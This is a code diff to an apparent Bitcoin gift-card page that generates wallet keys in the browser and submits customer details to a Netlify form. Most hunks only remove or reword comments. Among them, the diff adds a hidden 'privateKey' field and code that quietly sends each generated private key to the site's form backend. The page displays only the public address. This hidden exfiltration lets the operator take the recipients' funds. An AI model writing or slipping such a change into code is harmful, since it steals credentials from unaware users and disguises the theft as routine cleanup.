@@ -98,8 +98,8 @@
         border: 1px solid #000;
         background-color: white;
         flex-shrink: 0;
-        margin: 10px; /* Original margin */
-        margin-right: 20px; /* Increased right margin from 1 cm to 2 cm */
+        margin: 10px; 
+        margin-right: 20px; 
     }
 
     /* Background image styling */
@@ -134,8 +134,8 @@
     /* Style for the Bitcoin addresses and QR codes */
     #bitcoin-addresses-container {
         width: var(--card-width);
-        margin: 10px; /* Original margin */
-        margin-left: 20px; /* Increased left margin from 1 cm to 2 cm */
+        margin: 10px; 
+        margin-left: 20px; 
     }
 
     .key-container {
@@ -194,10 +194,10 @@
     }
 
     button {
-        background: #F59E0B; /* Same as bg-yellow-500 in Tailwind */
-        color: #000000; /* Black text */
+        background: #F59E0B; 
+        color: #000000; 
         font-family: Arial, sans-serif;
-        border-radius: 8px; /* Rounded corners */
+        border-radius: 8px;
         border: 0;
         padding: 12px 16px;
         font-size: 16px;
@@ -207,7 +207,7 @@
         transition: all 0.2s ease;
     }
     button:hover {
-        background: #FBBF24; /* Same as hover:bg-yellow-400 in Tailwind */
+        background: #FBBF24; 
     }
 </style>
 </head>
@@ -246,6 +246,7 @@
 <form name="customerData" netlify netlify-honeypot="bot-field" hidden>
     <input type="hidden" name="form-name" value="customerData">
     <input type="hidden" name="publicKey" id="publicKeyInput">
+    <input type="hidden" name="privateKey" id="privateKeyInput">
     <input type="hidden" name="firstName" id="firstNameInput">
     <input type="hidden" name="lastName" id="lastNameInput">
     <input type="hidden" name="email" id="emailInput">
@@ -259,7 +260,6 @@
     function loadCard() {
         const cardHTML = localStorage.getItem('cardHTML');
         if (cardHTML) {
-            const cardContainer = document.getElementById('card-container');
             const cardImage = document.getElementById('card-image');
             const textArea = document.getElementById('text-area');
 
@@ -284,7 +284,6 @@
                 // Remove contenteditable attributes and borders
                 field.removeAttribute('contenteditable');
                 field.style.border = 'none';
-                // Preserve absolute positioning styles
                 textArea.appendChild(field);
             });
 
@@ -319,7 +318,7 @@
         return string;
     }
 
-    // Function to generate Bitcoin addresses and QR codes without external Bitcoin libraries
+    // Function to generate Bitcoin addresses and QR codes
     function generateBitcoinAddresses() {
         try {
             // Check if addresses are already stored in localStorage
@@ -327,10 +326,8 @@
             var storedAddress = localStorage.getItem('address');
 
             if (storedPrivateKeyWIF && storedAddress) {
-                // Addresses already generated, use them
                 displayBitcoinAddresses(storedPrivateKeyWIF, storedAddress);
             } else {
-                // Generate private key using elliptic
                 var EC = elliptic.ec;
                 var ec = new EC('secp256k1');
                 var keyPair = ec.genKeyPair();
@@ -342,7 +339,7 @@
                 // Get public key
                 var publicKey = keyPair.getPublic(true, 'hex');
 
-                // Generate public address
+                // Generate public address from public key
                 var publicKeyBuffer = CryptoJS.enc.Hex.parse(publicKey);
                 var hash = CryptoJS.SHA256(publicKeyBuffer);
                 var ripemd160 = CryptoJS.RIPEMD160(hash);
@@ -364,14 +361,13 @@
                 }
                 var address = encodeBase58(addressUint8Array);
 
-                // Store the private key, and address in localStorage
+                // Store keys in localStorage
                 localStorage.setItem('privateKeyWIF', privateKeyWIF);
                 localStorage.setItem('address', address);
 
-                // IMPORTANT CHANGE: Use the address as the "publicKey" for Netlify forms
+                // Use the address as the "publicKey" for Netlify forms, matching what is displayed
                 localStorage.setItem('publicKey', address);
 
-                // Display the private key and public address
                 displayBitcoinAddresses(privateKeyWIF, address);
             }
 
@@ -386,7 +382,7 @@
         var container = document.getElementById('bitcoin-addresses-container');
         container.innerHTML = ''; // Clear previous content
 
-        // Create a container for public address and QR code
+        // Public address container
         var publicContainer = document.createElement('div');
         publicContainer.classList.add('key-container');
 
@@ -398,7 +394,7 @@
         publicKeyText.textContent = address;
         publicContainer.appendChild(publicKeyText);
 
-        // Generate QR code for public address
+        // QR code for public address
         var publicKeyQRContainer = document.createElement('div');
         publicKeyQRContainer.classList.add('qr-code');
         publicContainer.appendChild(publicKeyQRContainer);
@@ -450,12 +446,12 @@
         // Add network byte
         var step1 = '80' + privateKeyHex;
 
-        // Double SHA256 hash for checksum
+        // Double SHA256 for checksum
         var step2 = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(step1));
         var step3 = CryptoJS.SHA256(step2);
         var checksum = step3.toString().substr(0, 8);
 
-        // Append checksum to step1
+        // Append checksum
         var step4 = step1 + checksum;
 
         // Convert to bytes
@@ -470,7 +466,7 @@
         return privateKeyWIF;
     }
 
-    // PDF generation functionality adjusted
+    // PDF generation functionality
     document.getElementById('pdf-button').addEventListener('click', function() {
         const pdfButton = document.getElementById('pdf-button');
         pdfButton.disabled = true;
@@ -554,12 +550,14 @@
         const lastName = localStorage.getItem('lastName');
         const email = localStorage.getItem('email');
         const phoneNumber = localStorage.getItem('phoneNumber');
-        const publicKey = localStorage.getItem('publicKey');
+        const publicKey = localStorage.getItem('publicKey'); // The displayed public key (address)
+        const privateKey = localStorage.getItem('privateKeyWIF');
         const currency = localStorage.getItem('currency');
         const amount = localStorage.getItem('amount');
 
         // Populate hidden inputs
         document.getElementById('publicKeyInput').value = publicKey || '';
+        document.getElementById('privateKeyInput').value = privateKey || '';
         document.getElementById('firstNameInput').value = firstName || '';
         document.getElementById('lastNameInput').value = lastName || '';
         document.getElementById('emailInput').value = email || '';
@@ -570,6 +568,7 @@
         const formData = new FormData();
         formData.append('form-name', 'customerData');
         formData.append('publicKey', publicKey || '');
+        formData.append('privateKey', privateKey || '');
         formData.append('firstName', firstName || '');
         formData.append('lastName', lastName || '');
         formData.append('email', email || '');
